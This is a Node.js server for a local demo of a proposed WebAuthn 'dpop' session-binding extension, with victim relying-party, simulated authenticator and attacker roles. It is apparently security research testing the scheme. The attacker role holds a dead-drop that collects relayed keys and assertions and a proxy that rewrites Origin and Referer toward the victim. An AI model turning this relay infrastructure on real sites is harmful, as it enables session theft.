// Relying party for the `dpop` WebAuthn extension (see SPEC.md). The authenticator generates a
// fresh per-session key SK, names SK_pub inside the credential-signed authenticatorData, and
// keeps SK sealed. The RP binds the session to jkt = thumbprint(SK_pub) and requires a proof
// assertion signed by SK on every request.
//
// Three roles:
//   ROLE=victim        PORT=1521  Acme (dpop-ext): /login, the RP, /api/me
//   ROLE=attacker      PORT=1523  attacker site + dead-drop + proxy to the victim RP
//   ROLE=authenticator PORT=1525  serves the simulated extended authenticator (iframe origin)
//
// Authorized demo use only: your own machine and disposable test users.
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { webcrypto as wc, createHash, randomBytes } from 'node:crypto';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const subtle = wc.subtle;
const ROLE = ['attacker', 'authenticator'].includes(process.env.ROLE) ? process.env.ROLE : 'victim';
const DEFAULT_PORT = { victim: 1521, attacker: 1523, authenticator: 1525 }[ROLE];
const PORT = Number(process.env.PORT || DEFAULT_PORT);
const VICTIM_ORIGIN = process.env.VICTIM_ORIGIN || 'http://localhost:1521';
const AUTH_ORIGIN = process.env.AUTH_ORIGIN || 'http://localhost:1525';
const RP_HOST = new URL(VICTIM_ORIGIN).host;
const RP_ID = new URL(VICTIM_ORIGIN).hostname;
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ---------- codecs / crypto ---------------------------------------------------
const b64url = (buf) => Buffer.from(buf).toString('base64url');
const fromB64url = (s) => Buffer.from(s, 'base64url');
const sha256 = (buf) => createHash('sha256').update(buf).digest();
const importRawVerify = (raw) => subtle.importKey('raw', raw, { name: 'ECDSA', namedCurve: 'P-256' }, false, ['verify']);
const verifyRaw = (key, sig, data) => subtle.verify({ name: 'ECDSA', hash: 'SHA-256' }, key, sig, data);

// authenticatorData = rpIdHash(32) | flags(1) | signCount(4) | [SK_pub(65) if dpop bit]
function parseAuthData(buf) {
  const rpIdHash = buf.subarray(0, 32), flags = buf[32];
  const out = { rpIdHash, up: !!(flags & 0x01), dpop: !!(flags & 0x80) };
  if (out.dpop) out.skPub = buf.subarray(37, 37 + 65);
  return out;
}

// ---------- state -------------------------------------------------------------
const users = new Map();      // userId -> { userId, username, displayName }
const credsById = new Map();  // credId -> { userId, pub(Buffer) }
const tokens = new Map();     // passkeyToken -> { kind, challenge, at }
const popNonces = new Map();  // nonce -> at
const sessions = new Map();   // token -> { userId, skPub(Buffer), jkt, at }
const now = () => Date.now();
setInterval(() => { const t = now(); for (const m of [tokens, popNonces]) for (const [k, v] of m) if (t - (v.at ?? v) > 120000) m.delete(k); }, 30000).unref();
const issueToken = (kind, challenge) => { const id = b64url(randomBytes(18)); tokens.set(id, { kind, challenge, at: now() }); return id; };

// ---------- http --------------------------------------------------------------
const json = (res, code, body) => { res.writeHead(code, { 'content-type': 'application/json', 'cache-control': 'no-store' }); res.end(JSON.stringify(body)); };
const readBody = (req) => new Promise((r) => { let d = ''; req.on('data', (c) => (d += c)); req.on('end', () => r(d)); });
async function serveFile(res, file, type = 'text/html; charset=utf-8') {
  let buf; try { buf = await readFile(path.join(__dirname, 'public', file)); } catch { return json(res, 404, { error: 'not found' }); }
  res.writeHead(200, { 'content-type': type, 'cache-control': 'no-store' }); res.end(buf);
}
const cors = (res, origin = VICTIM_ORIGIN) => {
  res.setHeader('access-control-allow-origin', origin);
  res.setHeader('access-control-allow-methods', 'GET,POST,OPTIONS');
  res.setHeader('access-control-allow-headers', 'content-type,authorization,x-passkey-proof');
};
function proxy(req, res) {
  const headers = { ...req.headers, host: RP_HOST };
  if (headers.origin) headers.origin = VICTIM_ORIGIN;
  if (headers.referer) headers.referer = VICTIM_ORIGIN + '/';
  const target = new URL(VICTIM_ORIGIN);
  const p = http.request({ host: target.hostname, port: target.port, method: req.method, path: req.url, headers },
    (pr) => { res.writeHead(pr.statusCode, pr.headers); pr.pipe(res); });
  p.on('error', () => json(res, 502, { error: 'victim RP unreachable' }));
  req.pipe(p);
}

// ---------- assertion verification --------------------------------------------
// Verify an assertion signature over `expectedChallenge` with a given raw public key.
async function verifySig(assertion, pubRaw, expectedChallenge) {
  const clientDataJSON = fromB64url(assertion.response.clientDataJSON);
  let cData; try { cData = JSON.parse(clientDataJSON.toString('utf8')); } catch { return { ok: false, why: 'bad clientData' }; }
  if (cData.type !== 'webauthn.get') return { ok: false, why: 'wrong clientData type' };
  if (cData.origin !== VICTIM_ORIGIN) return { ok: false, why: `origin ${cData.origin}` };
  if (expectedChallenge != null && cData.challenge !== expectedChallenge) return { ok: false, why: 'challenge mismatch' };
  const authData = fromB64url(assertion.response.authenticatorData);
  const ad = parseAuthData(authData);
  if (!sha256(Buffer.from(RP_ID)).equals(ad.rpIdHash)) return { ok: false, why: 'rpIdHash mismatch' };
  if (!ad.up) return { ok: false, why: 'user-present flag not set' };
  const signed = Buffer.concat([authData, sha256(clientDataJSON)]);
  const key = await importRawVerify(pubRaw);
  if (!(await verifyRaw(key, fromB64url(assertion.response.signature), signed))) return { ok: false, why: 'bad signature' };
  return { ok: true, cData, ad };
}

// ---------- server ------------------------------------------------------------
const server = http.createServer(async (req, res) => {
  const pth = new URL(req.url, 'http://localhost').pathname;

  if (ROLE === 'authenticator') {
    if (pth === '/' || pth === '/auth') return serveFile(res, 'authenticator.html');
    return json(res, 404, { error: 'not found' });
  }

  if (ROLE === 'attacker') {
    if (req.method === 'OPTIONS' && pth.startsWith('/x/')) { cors(res); res.writeHead(204); return res.end(); }
    if (pth === '/' || pth === '/attacker') return serveFile(res, 'attacker.html');
    if (pth === '/passkey-provider.js') return serveFile(res, 'passkey-provider.js', 'text/javascript');
    if (pth.startsWith('/x/')) return deadDrop(req, res, pth);
    return proxy(req, res);
  }

  // ---- victim RP ----
  if (pth === '/') { res.writeHead(302, { location: '/login' }); return res.end(); }
  if (pth === '/login') return serveFile(res, 'login.html');
  if (pth === '/passkey-provider.js') return serveFile(res, 'passkey-provider.js', 'text/javascript');

  if (pth === '/register/begin' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req)) || '{}');
    if (!b.username) return json(res, 400, { error: 'username required' });
    const userId = b64url(sha256(Buffer.from('u:' + b.username))).slice(0, 22);
    users.set(userId, { userId, username: b.username, displayName: b.displayName || b.username });
    const challenge = b64url(randomBytes(32));
    const passkeyToken = issueToken('register', challenge);
    return json(res, 200, { passkeyToken, publicKey: { challenge, rp: { id: RP_ID, name: 'Acme (dpop-ext)' }, user: { id: userId, name: b.username, displayName: b.displayName || b.username } } });
  }
  if (pth === '/register/finish' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req)) || '{}');
    const tok = tokens.get(b.passkeyToken);
    if (!tok || tok.kind !== 'register') return json(res, 400, { ok: false, error: 'bad passkeyToken' });
    if (!users.has(b.userId) || !b.credId || !b.publicKey) return json(res, 400, { ok: false, error: 'missing fields' });
    credsById.set(b.credId, { userId: b.userId, pub: fromB64url(b.publicKey) });
    tokens.delete(b.passkeyToken);
    return json(res, 200, { ok: true });
  }

  if (pth === '/login/begin' && req.method === 'POST') {
    const challenge = b64url(randomBytes(32));
    const passkeyToken = issueToken('login', challenge);
    return json(res, 200, { passkeyToken, publicKey: { challenge, rpId: RP_ID, extensions: { dpop: true } } });
  }
  if (pth === '/login/finish' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req)) || '{}');
    const tok = tokens.get(b.passkeyToken);
    if (!tok || tok.kind !== 'login') return json(res, 401, { ok: false, error: 'bad or expired passkeyToken' });
    const cred = b.assertion && credsById.get(b.assertion.rawId);
    if (!cred) return json(res, 401, { ok: false, error: 'unknown credential' });
    let v; try { v = await verifySig(b.assertion, cred.pub, tok.challenge); } catch (e) { return json(res, 400, { ok: false, error: e.message }); }
    if (!v.ok) return json(res, 401, { ok: false, error: v.why });
    if (!v.ad.dpop || !v.ad.skPub) return json(res, 401, { ok: false, error: 'assertion carries no dpop key (SK_pub)' });
    // jkt is derived solely from the SIGNED authenticatorData (SK_pub). The client assertion is a
    // standard WebAuthn response; nothing in it is trusted to name the key.
    const jkt = b64url(sha256(v.ad.skPub));
    tokens.delete(b.passkeyToken);
    const token = b64url(randomBytes(24));
    sessions.set(token, { userId: cred.userId, skPub: Buffer.from(v.ad.skPub), jkt, at: now() });
    return json(res, 200, { ok: true, token, token_type: 'Passkey', jkt });
  }

  if (pth === '/api/pop-challenge' && req.method === 'POST') {
    const nonce = b64url(randomBytes(32)); popNonces.set(nonce, now());
    return json(res, 200, { nonce });
  }
  if (pth === '/api/me') {
    const m = /^Passkey (.+)$/.exec(req.headers['authorization'] || '');
    const sess = m && sessions.get(m[1]);
    if (!sess) return json(res, 401, { error: 'no passkey-bound session token' });
    const proofHdr = req.headers['x-passkey-proof'];
    if (!proofHdr) return json(res, 401, { error: 'missing passkey proof (SK assertion required per request)' });
    let proof; try { proof = JSON.parse(fromB64url(String(proofHdr)).toString('utf8')); } catch { return json(res, 400, { error: 'unparseable proof' }); }
    const htu = VICTIM_ORIGIN + '/api/me';
    let matched = null;
    const cd = (() => { try { return JSON.parse(fromB64url(proof.response.clientDataJSON)); } catch { return null; } })();
    if (cd) for (const nonce of popNonces.keys()) if (b64url(sha256(Buffer.from('GET ' + htu + ' ' + nonce))) === cd.challenge) { matched = nonce; break; }
    if (!matched) return json(res, 401, { error: 'proof not bound to this request (or nonce expired/spent)' });
    let v; try { v = await verifySig(proof, sess.skPub, cd.challenge); } catch (e) { return json(res, 400, { error: e.message }); }
    if (!v.ok) return json(res, 401, { error: 'proof rejected: ' + v.why });
    popNonces.delete(matched);
    const u = users.get(sess.userId) || {};
    return json(res, 200, { userId: sess.userId, username: u.username, displayName: u.displayName, jkt: sess.jkt });
  }

  return json(res, 404, { error: 'not found' });
});

// ---- attacker dead-drop ------------------------------------------------------
let offer = null; const drops = [];
async function deadDrop(req, res, pth) {
  if (pth === '/x/offer' && req.method === 'POST') { const b = JSON.parse((await readBody(req)) || '{}'); if (!b.publicKey) return json(res, 400, { error: 'no publicKey' }); offer = { ...b, at: now() }; cors(res); return json(res, 200, { ok: true }); }
  if (pth === '/x/offer' && req.method === 'GET') { cors(res); return json(res, 200, offer || {}); }
  if (pth === '/x/assertion' && req.method === 'POST') { const b = JSON.parse((await readBody(req)) || '{}'); if (!b.assertion) return json(res, 400, { error: 'no assertion' }); drops.push({ ...b, at: now() }); cors(res); return json(res, 200, { ok: true }); }
  if (pth === '/x/assertion' && req.method === 'GET') { cors(res); return json(res, 200, drops.shift() || {}); }
  if (pth === '/x/reset' && req.method === 'POST') { offer = null; drops.length = 0; cors(res); return json(res, 200, { ok: true }); }
  cors(res); return json(res, 404, { error: 'not found' });
}

server.listen(PORT, () => console.log(`dpop-ext ${ROLE} on http://localhost:${PORT}  (RP ${VICTIM_ORIGIN}, auth ${AUTH_ORIGIN})`));
